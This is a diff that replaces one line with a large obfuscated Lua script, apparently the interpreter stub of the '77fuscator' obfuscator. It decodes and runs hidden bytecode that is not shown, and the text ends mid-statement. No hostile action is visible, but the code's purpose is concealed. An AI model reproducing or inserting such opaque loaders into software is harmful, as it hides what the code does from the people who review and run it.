@@ -1,1 +1,3981 @@
-do local a=[[77fuscator 0.5.0 - discord.gg/CEHsVcBcuf]];return(function(b,c,d,e,f,f,g,h,i,j,k,l,l,m,n,o,p,q,r,s,t,u,u,v,w,w,x,y,y,z,z,z,ba,ba,bb,bb,bb,bc)local bd,be,bf,bg,bh,bi,bj,bk,bl,bm,bn,bo,bp,bq,br,bs,bt,bu,bv,bw,bx,by,bz,ca,cb,cc,cd,ce,cf,cg,ch,ci,cj,ck,cl,cm,cn,co,cp,cq,cr=0 while true do if bd<=17 then if bd<=8 then if bd<=3 then if bd<=1 then if bd<1 then be,bf,bg,bh,bi,bj,bk=string.sub,table.concat,string.char,tonumber,next,((table.create or function(cs,ct)local cu,cv=0 while true do if cu<=1 then if cu==0 then cv={}else for cw=1,cs do cv[cw]=ct;end;end else if 2==cu then return cv;else break end end cu=cu+1 end end)or tostring)else bl=1 end else if 3>bd then bm=function(bi)local bk,cs,ct,cu,cv,cw,cx,cy=0 while true do if bk<=5 then if bk<=2 then if bk<=0 then cs,ct=g,g else if 1==bk then cu=bj(#bi)else cv=256 end end else if bk<=3 then cw=bj(cv)else if 5>bk then for bj=0,(cv-1)do cw[bj]=bg(bj)end else cx=1 end end end else if bk<=8 then if bk<=6 then cy=function()local bj,cz,da=0 while true do if bj<=2 then if bj<=0 then cz=bh(be(bi,cx,cx),36)else if 2>bj then cx=(cx+1)else da=bh(be(bi,cx,cx+cz-1),36)end end else if bj<=3 then cx=cx+cz else if 5>bj then return da else break end end end bj=bj+1 end end else if bk<8 then cs=bg(cy())else cu[1]=cs end end else if bk<=9 then while cx<#bi and#a==d do local a=cy()if cw[a]then ct=cw[a]else ct=cs..be(cs,1,1)end cw[cv]=(cs..be(ct,1,1))cu[#cu+1],cs,cv=ct,ct,(cv+1)end else if bk==10 then return bf(cu)else break end end end end bk=bk+1 end end else bn=bm(b)end end else if bd<=5 then if bd>4 then c={u,i,l,o,s,x,y,m,w,q,j,k,nil};else bo={}end else if bd<=6 then bp=v else if bd~=8 then bq=bp(bo)else br,bs=1,((-6777+(function()local a,b,c,d=0 while true do if a<=1 then if 0<a then d=(function(k,q)local s=0 while true do if 1~=s then k(q(q,k),q(k,q))else break end s=s+1 end end)(function(k,q)local s=0 while true do if s<=2 then if s<=0 then if(b>161)then return k end else if 1==s then b=b+1 else c=(c+941)%35616 end end else if s<=3 then if((c%466)<=233)then c=(c-284)%12571 return q(k(k,k),q(q,q))else return k end else if 4==s then return q else break end end end s=s+1 end end,function(k,q)local s=0 while true do if s<=2 then if s<=0 then if(b>112)then return k end else if s~=2 then b=(b+1)else c=(c*598)%29356 end end else if s<=3 then if((c%520)==260 or(c%520)>260)then return q(q(k,k),q(q,(q and q)))else return k end else if 4<s then break else return q end end end s=s+1 end end)else b,c=0,1 end else if 2==a then return c;else break end end a=a+1 end end)()))end end end end else if bd<=12 then if bd<=10 then if bd==9 then bt={}else bu=function(a,b)local c,d=0 while true do if c<=1 then if 1~=c then d=0 else for k=0,31 do local q=a%2 local s=(b%2)if(q==0)then if not(s~=1)then b=b-1 d=d+2^k end else a=a-1 if not(s~=0)then d=d+2^k else b=b-1 end end b=b/2 a=(a/2)end end else if c~=3 then return d else break end end c=c+1 end end end else if bd==11 then bv=function(a,b)local c=0 while true do if c>0 then break else return((a*2^b));end c=c+1 end end else bw=function()local a,b,c=0 while true do if a<=1 then if a~=1 then b,c=h(bn,br,(br+2))else b,c=bu(b,bs),bu(c,bs);end else if a<=2 then br=(br+2);else if 4>a then return(bv(c,8))+b;else break end end end a=a+1 end end end end else if bd<=14 then if bd~=14 then do for a,b in o,l(bl)do bt[a]=b;end;end;else bx=bt end else if bd<=15 then by=function(a,b)local c=0 while true do if 1>c then return p((a/(2^b)));else break end c=c+1 end end else if 17>bd then bz=(2^32-1)else ca=function(a,b)local c=0 while true do if c>0 then break else return((a+b)-bu(a,b))/2 end c=c+1 end end end end end end end else if bd<=26 then if bd<=21 then if bd<=19 then if 18<bd then cc=function(a,b)local c=0 while true do if c>0 then break else return(bz-ca(bz-a,(bz-b)))end c=c+1 end end else cb=bw()end else if 20<bd then ce=bw()else cd=function(a,b,c)local d=0 while true do if d~=1 then if c then local c=(a/2^(b-1))%2^((c-1)-(b-1)+1)return c-c%1 else local b=2^(b-1)return(a%(b+b)>=b)and 1 or 0 end else break end d=d+1 end end end end else if bd<=23 then if bd~=23 then cf=function()local a,b,c,d,k=0 while true do if a<=1 then if a<1 then b,c,d,k=h(bn,br,(br+3))else b,c,d,k=bu(b,cb),bu(c,cb),bu(d,cb),bu(k,cb);end else if a<=2 then br=br+4;else if a>3 then break else return((bv(k,24)+bv(d,16)+bv(c,8))+b);end end end a=a+1 end end else cg=function()local a,b=0 while true do if a<=1 then if a<1 then b=bu(h(bn,br,br),cb)else br=br+1;end else if 3~=a then return b;else break end end a=a+1 end end end else if bd<=24 then ch,ci,cj=nil else if bd==25 then ch=((-14488+(function()local a,b,c,d,k,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by=0 while true do if a<=10 then if a<=4 then if a<=1 then if a>0 then c=48533 else b=526 end else if a<=2 then d=3 else if a~=4 then k=270 else p=540 end end end else if a<=7 then if a<=5 then q=12318 else if 7>a then s=385 else v=137 end end else if a<=8 then w=35083 else if a==9 then x=254 else y=340 end end end end else if a<=15 then if a<=12 then if 11<a then bf=170 else be=2 end else if a<=13 then bg=19255 else if 15~=a then bh=1 else bi=423 end end end else if a<=18 then if a<=16 then bj=240 else if a==17 then bk=0 else bs,bw=bk,bh end end else if a<=19 then by=(function(bz,ca)local cc=0 while true do if 1~=cc then ca(bz(bz,bz)and bz(bz,bz),ca(ca,(bz and bz))and ca(bz,ca))else break end cc=cc+1 end end)(function(bz,ca)local cc=0 while true do if cc<=2 then if cc<=0 then if bs>bj then local bj=bk while true do bj=(bj+bh)if not(bj~=bh)then return ca else break end end end else if 2>cc then bs=(bs+bh)else bw=((bw-bi)%bg)end end else if cc<=3 then if((bw%y)<bf)then local y=bk while true do y=(y+bh)if((y>be)or y==be)then if(y<d)then return ca(bz(bz,(bz and ca)),ca(bz,bz))else break end else bw=(bw+x)%w end end else local w=bk while true do w=(w+bh)if(w<be)then return ca else break end end end else if cc<5 then return bz else break end end end cc=cc+1 end end,function(w,x)local y=0 while true do if y<=2 then if y<=0 then if(bs>v)then local v=bk while true do v=v+bh if not(v~=be)then break else return w end end end else if 2~=y then bs=bs+bh else bw=((bw*s)%q)end end else if y<=3 then if((bw%p)>k)then local k=bk while true do k=(k+bh)if(k==bh or k<bh)then bw=(bw*b)%c else if not(not(k==d))then break else return w(x(w,x),w(x,w))end end end else local b=bk while true do b=b+bh if(b<be)then return w else break end end end else if y~=5 then return x else break end end end y=y+1 end end)else if 20==a then return bw;else break end end end end end a=a+1 end end)()));else ci=(-25303+(function()local a,b,c,d,k,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by=0 while true do if a<=10 then if a<=4 then if a<=1 then if a~=1 then b=40425 else c=236 end else if a<=2 then d=960 else if 4>a then k=1920 else p=33223 end end end else if a<=7 then if a<=5 then q=2 else if 7~=a then s=894 else v=201 end end else if a<=8 then w=3 else if a~=10 then x=1330 else y=5906 end end end end else if a<=15 then if a<=12 then if 11<a then bf=665 else be=617 end else if a<=13 then bg=211 else if a==14 then bh=33389 else bi=787 end end end else if a<=18 then if a<=16 then bj=1 else if 18>a then bk=0 else bs,bw=bk,bj end end else if a<=19 then by=(function(bz,ca)local cc=0 while true do if cc==0 then ca(ca(bz,bz),bz(ca,ca))else break end cc=cc+1 end end)(function(bz,ca)local cc=0 while true do if cc<=2 then if cc<=0 then if bs>bg then local bg=bk while true do bg=bg+bj if not(bg~=bj)then return ca else break end end end else if 1==cc then bs=(bs+bj)else bw=((bw-bi)%bh)end end else if cc<=3 then if(bw%x)<bf then local x=bk while true do x=(x+bj)if(x==bj or x<bj)then bw=(bw*be)%y else if not(x~=w)then break else return ca(ca(ca,ca),(bz(ca,ca)and ca(bz,ca)))end end end else local x=bk while true do x=(x+bj)if not(x~=q)then break else return ca end end end else if cc<5 then return ca else break end end end cc=cc+1 end end,function(x,y)local be=0 while true do if be<=2 then if be<=0 then if(bs>v)then local v=bk while true do v=(v+bj)if not(not(v==q))then break else return y end end end else if be==1 then bs=(bs+bj)else bw=((bw+s)%p)end end else if be<=3 then if((bw%k)>d)then local d=bk while true do d=(d+bj)if(d<bj or d==bj)then bw=((bw*c)%b)else if not(not(d==w))then break else return y(x(x,y and x),y(y,x))end end end else local b=bk while true do b=(b+bj)if b>bj then break else return x end end end else if 5~=be then return x else break end end end be=be+1 end end)else if 20==a then return bw;else break end end end end end a=a+1 end end)());end end end end else if bd<=31 then if bd<=28 then if bd>27 then ck=function()local a,b,c,d,k,p,q=0 while true do if a<=3 then if a<=1 then if a<1 then b,c=cf(),cf()else if(not(b~=0)and c==0)then return 0;end;end else if 2<a then k=((cd(c,1,20)*(2^32))+b)else d=1 end end else if a<=5 then if a~=5 then p=cd(c,21,31)else q=((-1)^cd(c,32))end else if a<=6 then if((p==0))then if((k==0))then return q*0;else p=1;d=0;end;elseif(not(p~=2047))then if((k==0))then return(q*(1/0));else return q*((0/0));end;end;else if 7==a then return(q*2^(p-1023)*(d+(k/(2^52))))else break end end end end a=a+1 end end else cj=(-1671+(function()local a=409;local b=818;local c=28939;local d=222;local k=389;local p=38485;local q=1166;local s=583;local v=9454;local w=425;local x=4509;local y=442;local be=292;local bf=3;local bg=1696;local bh=848;local bi=579;local bj=10108;local bk=252;local bs=908;local bw=5205;local by=470;local bz=746;local ca=1816;local cc=18568;local ce=2;local cs=1;local ct=421;local cu=0;local cv,cw=cu,cs;local a=(function(cx,cy,cz,da)cx(cy(da,da,cz,da),cz(cy,cx,cy,da),cz(cz,cy,cz,cz),da(cy and cx,da,cz,cz))end)(function(cx,cy,cz,da)if(cv>ct)then local ct=cu while true do ct=(ct+cs)if(ct<ce)then return cy else break end end end cv=cv+cs cw=(cw+bz)%cc if((cw%ca)==bs or(cw%ca)>bs)then local bs=cu while true do bs=bs+cs if(bs==cs or bs<cs)then cw=(cw-by)%bw else if not(bs~=ce)then return cy(cx(cz,cx,cx,(cy and cz)),cz(cy,cy,cx,(cz and da)),cz(cx,da,cx,cz),(cx(cz,(da and cy),cy and cz,cx)and cx((cz and da),cz and cx,da,cz)))else break end end end else local bs=cu while true do bs=bs+cs if not(bs~=ce)then break else return cx end end end return cy end,function(bs,bw,bz,ca)if cv>bk then local bk=cu while true do bk=bk+cs if not(bk~=ce)then break else return bs end end end cv=cv+cs cw=((cw-bi)%bj)if((cw%bg)==bh or(cw%bg)>bh)then local bg=cu while true do bg=bg+cs if(bg==ce or bg>ce)then if(bg<bf)then return bz else break end else cw=(cw*be)%x end end else local x=cu while true do x=(x+cs)if(x<ce)then return bs(bw(ca and bw,bs and bw,(bz and bs),bs),(ca(bw,ca,bw,(bz and ca))and bz(bz,ca,bz,bz)),bz(ca,bs and ca,bs,ca)and bw(bs,bs and bs,bz,bw),bz(bz,ca,(bw and ca),bz))else break end end end return bs(bz(bz,bw,bz and bs,ca),ca(bz,bz,ca,bs),bs(ca,ca,bw,bs),bw(bs,(bs and bs),bz,ca))end,function(x,be,bg,bh)if(cv>y)then local y=cu while true do y=y+cs if y<ce then return bh else break end end end cv=cv+cs cw=((cw+w)%v)if((cw%q)>s or(cw%q)==s)then local q=cu while true do q=(q+cs)if(q<cs or q==cs)then cw=((cw-by)%p)else if not(q~=bf)then break else return bh end end end else local p=cu while true do p=(p+cs)if not(p~=ce)then break else return bg(x(bg,(x and bg),be,bh),(bh(bg,x,be,bg)and be(bh,bh and bg,be,bg and bh)),bg(be,bg,x,bg),be(be,bh,be,be))end end end return x(bg(be and bh,be,be and x,(bh and bg)),bh(x,bg,bh,bg),bh(bh and bg,(bg and bg),be,bg),x(bg,bh,be,bh))end,function(p,q,s,v)if cv>k then local k=cu while true do k=k+cs if k<ce then return v else break end end end cv=cv+cs cw=(cw*d)%c if((cw%b)>a)then local a=cu while true do a=a+cs if(a<ce)then return p(s(v,p,p,(q and s)),p(p,s,q,(q and p))and v(q,v,v,q),q(p,v,p,(s and p)),s(p,s,p,s)and p(q,s,p,(p and v)))else break end end else local a=cu while true do a=a+cs if not(a~=ce)then break else return q end end end return v end)return cw;end)());end else if bd<=29 then cl="\46"else if 31>bd then cm=function()local a,b,c=0 while true do if a<=1 then if 1~=a then b,c=h(bn,br,br+2)else b,c=bu(b,cb),bu(c,cb);end else if a<=2 then br=(br+2);else if a==3 then return((bv(c,8))+b);else break end end end a=a+1 end end else cn=cf end end end else if bd<=33 then if bd<33 then co=function()local a,b,c,d,k=0 while true do if a<=2 then if a<=0 then b=g else if 1<a then d=0 else c=157 end end else if a<=3 then k={}else if 5>a then while d<8 do d=d+1;while(d<707 and c%1622<811)do c=((c*35))local p=(d+c)if((c%16522)<8261)then c=(c*19)while((((d<828))and((c%658)<329)))do c=((c+60))local p=(d+c)if((((c%18428))==9214 or(((c%18428))<9214)))then c=((c-50))local p=10701 if not k[p]then k[p]=1;local p,q=cn(),g;if not((p~=0))then return g;end;b=j(bn,br,((br+p)-1));br=(br+p);return z(b,cl,function(p)local q,s=0 while true do if q<=0 then s=0 else if 2~=q then while true do if(0<s)then break else return i(h(p))end s=(s+1)end else break end end q=q+1 end end);end elseif(not(c%4==0))then c=(c-67)local p=33140 if not k[p]then k[p]=1;return z(b,cl,function(p)local q,s=0 while true do if q<=0 then s=0 else if 1<q then break else while true do if not(s==1)then return i(h(p))else break end s=(s+1)end end end q=q+1 end end);end else c=(c*88)d=d+1 local p=92657 if not k[p]then k[p]=1;return z(b,cl,function(p)local q,s=0 while true do if q<=0 then s=0 else if q~=2 then while true do if 1>s then return i(h(p))else break end s=(s+1)end else break end end q=q+1 end end);end end;d=(d+1);end elseif not(not(c%4~=0))then c=(c-48)while((((d<859))and(c%1392<696)))do c=(c*39)local p=(d+c)if(c%58)<29 then c=((c+5))local p=33930 if not k[p]then k[p]=1;return z(b,cl,function(p)local q,s=0 while true do if q<=0 then s=0 else if 2>q then while true do if s>0 then break else return i(h(p))end s=s+1 end else break end end q=q+1 end end);end elseif not((c%4==0))then c=(c*56)local p=35370 if not k[p]then k[p]=1;return z(b,cl,function(p)local q,s=0 while true do if q<=0 then s=0 else if 1<q then break else while true do if(s>0)then break else return i(h(p))end s=(s+1)end end end q=q+1 end end);end else c=((c*9))d=(d+1)local p=96267 if not k[p]then k[p]=1;return z(b,cl,function(p)local q,s=0 while true do if q<=0 then s=0 else if q<2 then while true do if not(1==s)then return i(h(p))else break end s=s+1 end else break end end q=q+1 end end);end end;d=d+1;end else c=((c-51))d=((d+1))while(d<663)and((c%936)<468)do c=((c*12))local p=((d+c))if((c%18532)>=9266)then c=(c*71)local p=7037 if not k[p]then k[p]=1;return z(b,cl,function(p)local q,s=0 while true do if q<=0 then s=0 else if q~=2 then while true do if(s>0)then break else return i(h(p))end s=(s+1)end else break end end q=q+1 end end);end elseif not(c%4==0)then c=(c-18)local p=90882 if not k[p]then k[p]=1;return z(b,cl,function(p)local q,s=0 while true do if q<=0 then s=0 else if 1<q then break else while true do if(1~=s)then return i(h(p))else break end s=(s+1)end end end q=q+1 end end);end else c=(c*35)d=(d+1)local p=41573 if not k[p]then k[p]=1;return z(b,cl,function(b)local k,p=0 while true do if k<=0 then p=0 else if k<2 then while true do if p==0 then return i(h(b))else break end p=(p+1)end else break end end k=k+1 end end);end end;d=d+1;end end;d=(d+1);end c=((c-494))if((d>43))then break;end;end;else break end end end a=a+1 end end else cp=cf end else if bd<=34 then cq=function(...)local a=0 while true do if a==0 then return{...},n("\35",...)else break end a=a+1 end end else if 36>bd then cr=function()local a,b,c,d,k,p,q,s,v,w=0 while true do if a<=9 then if a<=4 then if a<=1 then if 0==a then b,c,d,k={},{},{},{}else p=m({[ch]=b,nil,[ci]=c,nil,[776]=k,[345]=bb,[536]=nil},{['\95\95\116\111\115\116\114\105\110\103']=function(...)return j(bn,br,br);end,})end else if a<=2 then q={}else if 3<a then v=0 else s=490 end end end else if a<=6 then if a~=6 then w={}else while(v<3)do v=((v+1));while(v<481 and s%320<160)do s=((s*62))local d=v+s if((s%916)>458)then s=(((s-88)))while((v<318)and(s%702)<351)do s=((s*8))local d=((v+s))if(s%14064)>7032 then s=((s*81))local d=58084 if not w[d]then w[d]=1;q[cf()]=nil;end elseif not(s%4==0)then s=(s*37)local d=93269 if not w[d]then w[d]=1;q[cf()]=nil;end else s=((s+10))v=(v+1)local d=78058 if not w[d]then w[d]=1;for d=1,cf()do local j=cg();if(not(j~=1))then q[d]=nil;elseif(not(not(j==3)))then q[d]=(not((cg()==0)));elseif((j==0))then q[d]=ck();elseif(not(not(j==2)))then q[d]=co();end;end;p[cj]=q;end end;v=v+1;end elseif not(not((s%4)~=0))then s=(((s*65)))while(v<615 and s%618<309)do s=((s-33))local d=v+s if(((s%15582)>7791))then s=(((s*14)))local d=31092 if not w[d]then w[d]=1;q[cf()]=nil;end elseif not((s%4==0))then s=(((s+51)))local d=68285 if not w[d]then w[d]=1;q[cf()]=nil;end else s=(((s+53)))v=(v+1)local d=64266 if not w[d]then w[d]=1;q[cf()]=nil;end end;v=((v+1));end else s=((s+7))v=(v+1)while(((v<127)and(s%1548)<774))do s=((s-37))local d=(v+s)if((s%19188)>9594)then s=((s*61))local d=73351 if not w[d]then w[d]=1;q[cf()]=nil;end elseif not(not((s%4)~=0))then s=(s+25)local d=78934 if not w[d]then w[d]=1;q[cf()]=nil;end else s=(((s+42)))v=((v+1))local d=62692 if not w[d]then w[d]=1;q[cf()]=nil;end end;v=((v+1));end end;v=v+1;end s=((s*482))if(v>56)then break;end;end;end else if a<=7 then s=307 else if a<9 then v=0 else w={}end end end end else if a<=14 then if a<=11 then if 10==a then while v<1 do v=v+1;while((v<52)and s%1648<824)do s=((s+33))local d=(v+s)if(s%18136)<9068 then s=((s-83))while((v<351))and(((s%420)<210))do s=(s-42)local d=((v+s))if((s%5554)<2777)then s=(((s*26)))local d=57826 if not w[d]then w[d]=1;local d=1;local j=2;local k=3;local x=4;for x=1,cf()do local y=cg();local bb=cd(y,d,d);if((not(not(bb==0))))then local y,bb,be=cd(y,j,k),cd(y,4,6),m({[626]=cm(),[28]=cm(),nil,nil},{['\95\95\116\111\115\116\114\105\110\103']=function(...)return cd(y,j,k);end,})if((((not(y~=0)))or(not(y~=d))))then be[312]=cf();if((not(y~=0)))then be[227]=cf();end;elseif((((y==j)))or(not((y~=k))))then be[312]=cf()-(e);if((y==k))then be[227]=cm();end;end;if((cd(bb,d,d)==d))then be[28]=q[be[28]];end;if(not(not(not(cd(bb,j,j)~=d))))then be[312]=q[be[312]];end;if(not(not((cd(bb,k,k)==d))))then be[227]=q[be[227]];end;b[x]=be;end;end;end elseif not((s%4)==0)then s=((s+77))local b=81182 if not w[b]then w[b]=1;end else s=((s-82))v=(v+1)local b=59665 if not w[b]then w[b]=1;end end;v=((v+1));end elseif not(s%4==0)then s=((s-40))while(v<63 and((s%1614)<807))do s=((s*29))local b=(v+s)if(((s%10732)==5366 or(s%10732)<5366))then s=((s*35))local b=97858 if not w[b]then w[b]=1;end elseif(s%4~=0)then s=((s-76))local b=7299 if not w[b]then w[b]=1;end else s=((s*96))v=v+1 local b=42844 if not w[b]then w[b]=1;end end;v=((v+1));end else s=((s+43))v=v+1 while(v<553 and s%1368<684)do s=(((s*89)))local b=v+s if(s%6806)>=3403 then s=((s*62))local b=39324 if not w[b]then w[b]=1;end elseif s%4~=0 then s=((s*9))local b=14940 if not w[b]then w[b]=1;end else s=((s+68))v=(v+1)local b=44361 if not w[b]then w[b]=1;end end;v=(v+1);end end;v=((v+1));end s=((s+720))if(v>64)then break;end;end;else p[481]=cg();end else if a<=12 then for b=1,cf()do c[b-1]=cr();end;else if a==13 then do for b=1,#p[ch]do local b=p[ch][b]local c,d,e=b[28],b[312],b[227]if not((bp(c)~=f))then c=z(c,cl,function(j,k,k)local k,q=0 while true do if k<=0 then q=0 else if 1==k then while true do if(1>q)then return i(bu(h(j),cb))else break end q=q+1 end else break end end k=k+1 end end)b[28]=c end if(not(not(bp(d)==f)))then d=z(d,cl,function(c,j,j)local j,k=0 while true do if j<=0 then k=0 else if 2~=j then while true do if not(k==1)then return i(bu(h(c),cb))else break end k=(k+1)end else break end end j=j+1 end end)b[312]=d end if not(not((bp(e)==f)))then e=z(e,cl,function(c,d,d)local d,j=0 while true do if d<=0 then j=0 else if d==1 then while true do if(0<j)then break else return i(bu(h(c),cb))end j=j+1 end else break end end d=d+1 end end)b[227]=e end;end;p[cj]=nil;end;else s=786 end end end else if a<=16 then if a==15 then v=0 else w={}end else if a<=17 then while(v<2)do v=((v+1));while(((v<135)and s%912<456))do s=(((s-28)))local b=(v+s)if((((s%19394))==9697 or((s%19394))<9697))then s=(((s*49)))while(v<876 and s%258<129)do s=(s*38)local b=((v+s))if(((s%4908))>2454 or((s%4908))==2454)then s=((s*14))local b=6003 if not w[b]then w[b]=1;end elseif not(s%4==0)then s=((s-36))local b=7367 if not w[b]then w[b]=1;p[536]=function(...)local b,c,d,e,h=0 while true do if b<=0 then c,d,e,h=0 else if b==1 then while true do if(c<=2)then if(c<0 or c==0)then d=n(1,...)else if c==1 then e=({...})else do for d=0,#e do if bp(e[d])==bq then for i,i in o,e[d]do if(bp(i)==bp(g))then t(bo,i)end end else t(bo,e[d])end end end end end else if(c<3 or c==3)then h=function(d)local g,i,j=0 while true do if g<=0 then i,j=0 else if g==1 then while true do if(i<=1)then if(i<1)then j=u(d)else for j=0,#bo do if ba(d,bo[j])then return bm(f);end end end else if i>2 then break else return false end end i=(i+1)end else break end end g=g+1 end end else if(4<c)then break else for d=0,#e do if(bp(e[d])==bq)then return h(e[d])end end end end end c=(c+1)end else break end end b=b+1 end end end else s=(s-17)v=(v+1)local b=26632 if not w[b]then w[b]=1;return p end end;v=((v+1));end elseif not(not(s%4~=0))then s=(((s+8)))while(v<136 and s%806<403)do s=(((s-66)))local b=((v+s))if((s%14728)>7364)then s=((s+17))local b=9544 if not w[b]then w[b]=1;return p end elseif not(not(((s%4))~=0))then s=((s-51))local b=47883 if not w[b]then w[b]=1;return p end else s=((s*17))v=v+1 local b=47602 if not w[b]then w[b]=1;return p end end;v=((v+1));end else s=((s+67))v=(v+1)while(v<713 and s%986<493)do s=(((s+88)))local b=(v+s)if((s%4530)<2265)then s=((s-8))local b=87643 if not w[b]then w[b]=1;end elseif not(not(s%4~=0))then s=((s+86))local b=25043 if not w[b]then w[b]=1;return p end else s=(((s+50)))v=((v+1))local b=43799 if not w[b]then w[b]=1;return p end end;v=v+1;end end;v=v+1;end s=((s-631))if(v>95)then break;end;end;else if 19>a then return p;else break end end end end end a=a+1 end end else break end end end end end end bd=bd+1 end local function a(b,c)local d if bp(l)==bq then d=l;else d=l(bl);end local e={}for f,g in o,d do if g~=b then e[f]=g else e[f]=c;end end if bc then return bc(bl,e)else l=e;return l;end end;local function b(...)local c=n(bl,...);local d=c[ci];local e=c[536];local f=c[ch];local g=n(2,...);local h=c[345];local i=n(3,...);local j=c[481];local c=c[776];local c=bt[ba(bx,h)];return function(...)local h,k,n,o,p,q,s,u=cq,1,-1,{},{...},(n("\35",...)-1),{},{};for v=0,q,1 do if(v>=j)then o[v-j]=p[v+1];else u[v]=p[v+1];end;end;local v,w,x,y=(q-j+1),nil,nil,{};while true do w=f[k];x=w[626];if 83>=x then if x<=41 then if x<=20 then if 9>=x then if(x<4 or x==4)then if(x==1 or x<1)then if not(x~=0)then u[w[28]]=g[w[312]];else local y=w[28]u[y]=u[y](r(u,(y+1),w[312]))end;elseif 2>=x then local y,z=0 while true do if y<=7 then if y<=3 then if y<=1 then if y==0 then z=nil else u[w[28]]=u[w[312]][w[227]];end else if 3~=y then k=k+1;else w=f[k];end end else if y<=5 then if 5>y then u[w[28]]=u[w[312]];else k=k+1;end else if 7~=y then w=f[k];else u[w[28]]=g[w[312]];end end end else if y<=11 then if y<=9 then if y<9 then k=k+1;else w=f[k];end else if 10<y then k=k+1;else u[w[28]]=u[w[312]][w[227]];end end else if y<=13 then if y<13 then w=f[k];else z=w[28]end else if y>14 then break else u[z]=u[z](r(u,z+1,w[312]))end end end end y=y+1 end elseif(4~=x)then local y=w[28];do return r(u,y,n)end;else local y,z=0 while true do if y<=19 then if y<=9 then if y<=4 then if y<=1 then if y~=1 then z=nil else u[w[28]]={};end else if y<=2 then k=k+1;else if 4>y then w=f[k];else u[w[28]][w[312]]=u[w[227]];end end end else if y<=6 then if y<6 then k=k+1;else w=f[k];end else if y<=7 then u[w[28]][w[312]]=u[w[227]];else if 9>y then k=k+1;else w=f[k];end end end end else if y<=14 then if y<=11 then if 10==y then u[w[28]][w[312]]=u[w[227]];else k=k+1;end else if y<=12 then w=f[k];else if 14~=y then u[w[28]][w[312]]=u[w[227]];else k=k+1;end end end else if y<=16 then if y~=16 then w=f[k];else u[w[28]][w[312]]=u[w[227]];end else if y<=17 then k=k+1;else if y==18 then w=f[k];else u[w[28]][w[312]]=u[w[227]];end end end end end else if y<=29 then if y<=24 then if y<=21 then if y~=21 then k=k+1;else w=f[k];end else if y<=22 then u[w[28]]={};else if 23==y then k=k+1;else w=f[k];end end end else if y<=26 then if y>25 then k=k+1;else u[w[28]][w[312]]=u[w[227]];end else if y<=27 then w=f[k];else if y<29 then u[w[28]]=i[w[312]];else k=k+1;end end end end else if y<=34 then if y<=31 then if y>30 then u[w[28]]=u[w[312]];else w=f[k];end else if y<=32 then k=k+1;else if 34~=y then w=f[k];else u[w[28]]=u[w[312]];end end end else if y<=36 then if y>35 then w=f[k];else k=k+1;end else if y<=37 then z=w[28]else if y>38 then break else u[z](r(u,z+1,w[312]))end end end end end end y=y+1 end end;elseif(x<=6)then if x>5 then local y=w[28]local z={}for ba=1,#s do local bb=s[ba]for bc=1,#bb do local bb=bb[bc]local bc,bc=bb[1],bb[2]if(bc>=y)then z[bc]=u[bc]bb[1]=z s[ba]=nil;end end end else if u[w[28]]then k=(k+1);else k=w[312];end;end;elseif 7>=x then u[w[28]]={};elseif(x>8)then u[w[28]]=u[w[312]][w[227]];else u[w[28]]=u[w[312]][u[w[227]]];end;elseif(14>=x)then if(x<11 or x==11)then if(10==x)then u[w[28]]=u[w[312]][w[227]];else if(u[w[28]]<u[w[227]]or u[w[28]]==u[w[227]])then k=(k+1);else k=w[312];end;end;elseif x<=12 then local y=d[w[312]];local z={};local ba={};for bb=1,w[227]do k=(k+1);local bc=f[k];if bc[626]==105 then ba[bb-1]={u,bc[312],nil,nil,nil,nil,nil,nil};else ba[(bb-1)]={g,bc[312],nil,nil,nil,nil,nil,nil};end;s[(#s+1)]=ba;end;m(z,{['\95\95\105\110\100\101\120']=function(bb,bb)local bb=ba[bb];return bb[1][bb[2]];end,['\95\95\110\101\119\105\110\100\101\120']=function(bb,bb,bc)local ba=ba[bb]ba[1][ba[2]]=bc;end;});u[w[28]]=b(y,z,i);elseif 14~=x then local y,z=0 while true do if y<=8 then if y<=3 then if y<=1 then if 0==y then z=nil else u[w[28]]=u[w[312]][w[227]];end else if 3>y then k=k+1;else w=f[k];end end else if y<=5 then if 5>y then u[w[28]]=g[w[312]];else k=k+1;end else if y<=6 then w=f[k];else if y==7 then u[w[28]]=u[w[312]][u[w[227]]];else k=k+1;end end end end else if y<=13 then if y<=10 then if y<10 then w=f[k];else u[w[28]]=g[w[312]];end else if y<=11 then k=k+1;else if y~=13 then w=f[k];else u[w[28]]=u[w[312]][w[227]];end end end else if y<=15 then if y<15 then k=k+1;else w=f[k];end else if y<=16 then z=w[28]else if y~=18 then u[z]=u[z](r(u,z+1,w[312]))else break end end end end end y=y+1 end else if(u[w[28]]<=u[w[227]])then k=k+1;else k=w[312];end;end;elseif(x==17 or x<17)then if 15>=x then a(c,e);elseif x>16 then local y,z=0 while true do if y<=8 then if y<=3 then if y<=1 then if y<1 then z=nil else u[w[28]]=u[w[312]][w[227]];end else if 2==y then k=k+1;else w=f[k];end end else if y<=5 then if y==4 then u[w[28]]=g[w[312]];else k=k+1;end else if y<=6 then w=f[k];else if 7==y then u[w[28]]=u[w[312]][w[227]];else k=k+1;end end end end else if y<=13 then if y<=10 then if 10>y then w=f[k];else u[w[28]]=g[w[312]];end else if y<=11 then k=k+1;else if y>12 then u[w[28]]=u[w[312]][w[227]];else w=f[k];end end end else if y<=15 then if 15>y then k=k+1;else w=f[k];end else if y<=16 then z=w[28]else if y~=18 then u[z]=u[z](r(u,z+1,w[312]))else break end end end end end y=y+1 end else u[w[28]]=false;end;elseif(18>x or 18==x)then local y=w[28]u[y]=u[y](u[(y+1)])elseif(x<20)then u[w[28]]=b(d[w[312]],nil,i);else do return end;end;elseif 30>=x then if x<=25 then if 22>=x then if x<22 then a(c,e);k=k+1;w=f[k];u={};for y=0,q,1 do if y<j then u[y]=p[y+1];else break;end;end;k=k+1;w=f[k];u[w[28]]=w[312];k=k+1;w=f[k];u[w[28]]=i[w[312]];k=k+1;w=f[k];u[w[28]]=i[w[312]];k=k+1;w=f[k];u[w[28]]=u[w[312]][w[227]];else local y=w[28]u[y](r(u,y+1,n))end;elseif 23>=x then local y=w[28];n=y+v-1;for z=y,n do local y=o[z-y];u[z]=y;end;elseif x>24 then u[w[28]][u[w[312]]]=u[w[227]];else u[w[28]]=u[w[312]][u[w[227]]];end;elseif x<=27 then if x~=27 then local y=w[28];n=y+v-1;for v=y,n do local o=o[v-y];u[v]=o;end;else local 